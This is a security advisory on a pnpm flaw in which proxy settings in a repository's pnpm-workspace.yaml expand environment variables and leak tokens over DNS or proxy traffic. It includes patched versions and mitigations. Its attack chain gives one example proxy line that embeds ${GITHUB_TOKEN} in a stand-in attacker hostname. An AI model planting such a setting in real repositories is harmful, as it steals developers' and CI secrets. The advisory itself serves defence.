---
title: Environment Secret Exfiltration via pnpm-workspace.yaml Proxy Settings
slug: 2026-09-pnpm-secret-exfiltration
description: A vulnerability in pnpm allows local environment variable exfiltration when a user executes 'pnpm install' in a malicious repository containing a crafted 'pnpm-workspace.yaml' file.
date: "2026-09-02T00:01:10Z"
type: advisory
types:
  - advisory
severities:
  - high
tags:
  - supply-chain
  - exfiltration
  - pnpm
vendors:
  - pnpm
products:
  - pnpm (>= 11.0.0, < 11.11.0)
  - pnpm (>= 10.7.0, < 10.34.5)
mitre_ttps:
  - tactic_id: TA0001
    tactic_name: Initial Access
    technique_id: T1566
    technique_name: Phishing
    evidence: An attacker who controls only the contents of a repository's pnpm-workspace.yaml can read many values out of the victim's process environment.
    confidence_band: med
  - tactic_id: TA0010
    tactic_name: Exfiltration
    technique_id: T1048
    technique_name: Exfiltration Over Alternative Protocol
    evidence: The secret is exfiltrated during config loading, before any lifecycle script runs.
    confidence_band: high
references:
  - https://github.com/advisories/GHSA-vx52-2968-3vc6
  - https://github.com/orgs/pnpm/discussions/13598
action_plan:
  priority: elevated
  owners:
    - SOC
    - Developer Experience
  immediate_actions:
    - action: Upgrade pnpm to 11.11.0 or 10.34.5
      owner: Developer Experience
      due: 48h
      evidence: Vendor patches provided in advisory.
  mitigation_plan:
    - priority: immediate
      action: Enforce network egress restrictions on CI/CD runner environments
      owner: IT Operations
      addresses: All pnpm-based projects
      evidence: Prevent exfiltration to attacker-controlled proxies.
---

pnpm versions 10.7.0 through 10.34.4 and 11.0.0 through 11.10.9 are susceptible to an environment variable exfiltration vulnerability. The issue occurs because pnpm expands environment variable placeholders (e.g., `${NPM_TOKEN}`) within `httpProxy`, `httpsProxy`, `noProxy`, `proxy`, and `noproxy` settings when read from a project's `pnpm-workspace.yaml` file. 

Because these manifest files are controlled by repository authors, an attacker can commit a malicious `pnpm-workspace.yaml` to a public repository or provide it as part of a supply-chain attack. When a developer or CI/CD system clones the repository and executes `pnpm install`, the tool parses the proxy settings and expands the environment variables. The resulting value, containing the secret, is used to route installation traffic through an attacker-controlled proxy server. The sensitive data is leaked through the hostname or user-info portion of the connection, which is visible to the attacker-controlled proxy or the authoritative DNS resolver. This occurs during the configuration loading phase, before any project lifecycle scripts are executed.

## Attack Chain

1. Attacker creates a malicious repository containing a custom `pnpm-workspace.yaml` file.
2. The `pnpm-workspace.yaml` includes a proxy setting, such as `httpsProxy: "http://${GITHUB_TOKEN}.collector.attacker.example.com"`.
3. A victim clones the repository or pulls a malicious branch containing the workspace manifest.
4. The victim executes `pnpm install` within the root of the repository.
5. The pnpm process reads the `pnpm-workspace.yaml` and processes the proxy configuration.
6. The process expands the environment variable placeholder `${GITHUB_TOKEN}` with the actual secret from the victim's environment.
7. pnpm attempts to route network traffic through the hostname identified in the proxy string, triggering an external DNS request and connection attempt.
8. The attacker captures the sensitive environment secret from the DNS query or proxy request headers.

## Impact

Successful exploitation results in the exfiltration of sensitive environment variables such as `NPM_TOKEN` or `GITHUB_TOKEN` from the victim's local machine or CI/CD environment. This exposure can grant attackers unauthorized access to private package registries, version control systems, or other integrated services, potentially enabling further supply-chain attacks or source code theft. The vulnerability affects all users of pnpm versions within the specified ranges, regardless of their operating system.

## Recommendation

Prioritized actions for security teams:
- Immediately upgrade all pnpm instances to version 11.11.0 or 10.34.5 and later.
- Implement a policy to inspect `pnpm-workspace.yaml` files for proxy configurations in untrusted or newly cloned repositories before executing installation commands.
- In CI/CD pipelines, ensure that pnpm is executed in environments with restricted network egress, and avoid injecting high-privilege secrets into the shell environment where package managers are executed.
- Audit environment variables used in CI/CD pipelines to identify sensitive tokens that might be targeted by this technique.
